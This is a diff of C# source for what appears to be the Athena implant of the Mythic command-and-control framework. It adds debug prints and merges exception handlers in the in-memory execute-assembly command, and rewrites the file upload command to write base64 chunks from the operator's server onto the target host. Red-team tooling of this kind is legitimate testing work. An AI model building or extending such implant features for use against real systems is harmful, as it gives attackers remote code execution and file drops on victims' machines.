@@ -34,8 +34,10 @@ namespace Athena.Commands
                     });
                     break;
                 case "execute-assembly":
+                    Console.WriteLine("exec-assm");
                     if (Globals.executeAssemblyTask != "")
                     {
+                        Console.WriteLine("exists.");
                         job.complete = true;
                         job.errored = true;
                         job.taskresult = "Failed to load assembly. Another assembly is already executing.";
@@ -43,6 +45,7 @@ namespace Athena.Commands
                     }
                     else
                     {
+                        Console.WriteLine("Assembly Not Found.");
                         var t = Task.Run(() =>
                         {
                             job.cancellationtokensource.Token.ThrowIfCancellationRequested();
@@ -70,20 +73,9 @@ namespace Athena.Commands
                                             Console.SetOut(origStdout);
                                             return;
                                         }
-                                        catch (ThreadInterruptedException)
+                                        catch (Exception)
                                         {
                                             //Cancellation was requested, clean up.
-                                            Globals.executeAssemblyTask = "";
-                                            job.hasoutput = true;
-                                            job.complete = true;
-                                            job.errored = true;
-                                            Console.SetOut(origStdout); 
-                                            Globals.alc.Unload();
-                                            Globals.alc = new ExecuteAssemblyContext();
-                                            return;
-                                        }
-                                        catch(ThreadAbortException)
-                                        {
                                             Globals.executeAssemblyTask = "";
                                             job.hasoutput = true;
                                             job.complete = true;
@@ -99,16 +91,6 @@ namespace Athena.Commands
                                     
                                     //Start our assembly.
                                     Globals.executeAseemblyThread.Start();
-                                }
-                                catch(OperationCanceledException e)
-                                {
-                                    //General exception catching
-                                    Globals.executeAssemblyTask = "";
-                                    job.complete = true;
-                                    job.taskresult = e.Message;
-                                    job.errored = true;
-                                    job.hasoutput = true;
-                                    Console.SetOut(origStdout);
                                 }
                                 catch(Exception e)
                                 {
@@ -284,12 +266,55 @@ namespace Athena.Commands
                     {
                         try
                         {
-                            Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
-                            Console.WriteLine(par["path"]);
-                            Console.WriteLine(par["file"]);
-                            job.taskresult = FileHandler.uploadFile(par["path"], Misc.Base64DecodeToByteArray(par["file"]));
-                            job.hasoutput = true;
-                            job.complete = true;
+                            if (!Globals.uploadJobs.ContainsKey(job.task.id)){
+                                MythicUploadJob uj = new MythicUploadJob(job);
+                                Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
+                                uj.path = par["remote_path"];
+                                uj.file_id = par["file"];
+                                uj.task = job.task;
+                                uj.chunk_num = 1;
+                                job.started = true;
+                                job.hasoutput = true;
+                                job.taskresult = "";
+                                
+                                //Add job to job tracking Dictionary
+                                Globals.uploadJobs.Add(uj.task.id, uj);
+
+                                while(uj.total_chunks == 0)
+                                {
+                                    //wait for total_chunks to be populated.
+                                }
+
+                                while(uj.chunk_num != uj.total_chunks+1)
+                                {
+                                    if (!uj.locked && uj.chunkUploads.Count() > 0)
+                                    {
+                                        try
+                                        {
+                                            Console.WriteLine($"Writing Chunk: {uj.chunk_num}/{uj.total_chunks}");
+                                            Misc.AppendAllBytes(uj.path, Misc.Base64DecodeToByteArray(uj.chunkUploads[uj.chunk_num]));
+                                            //Finished with chunk, remove it.
+                                            uj.chunkUploads.Remove(uj.chunk_num);
+                                            uj.chunk_num++;
+                                            job.hasoutput = true;
+                                            job.taskresult = "";
+                                            uj.uploadStarted = true;
+                                        }
+                                        catch (Exception e)
+                                        {
+                                            job.complete = true;
+                                            job.taskresult = e.Message;
+                                            job.hasoutput = true;
+                                            uj.complete = true;
+                                        }
+
+                                    }
+                                }
+                                job.complete = true;
+                                job.taskresult = "File Uploaded Successfully.";
+                                job.hasoutput = true;
+                                uj.complete = true;
+                            }
                         }
                         catch (Exception e)
                         {
@@ -315,7 +340,7 @@ namespace Athena.Commands
                 job.taskresult += e.Value + Environment.NewLine;
                 job.hasoutput = true;
             }
-            catch
+            catch (Exception)
             {
                 //Fail silently
             }
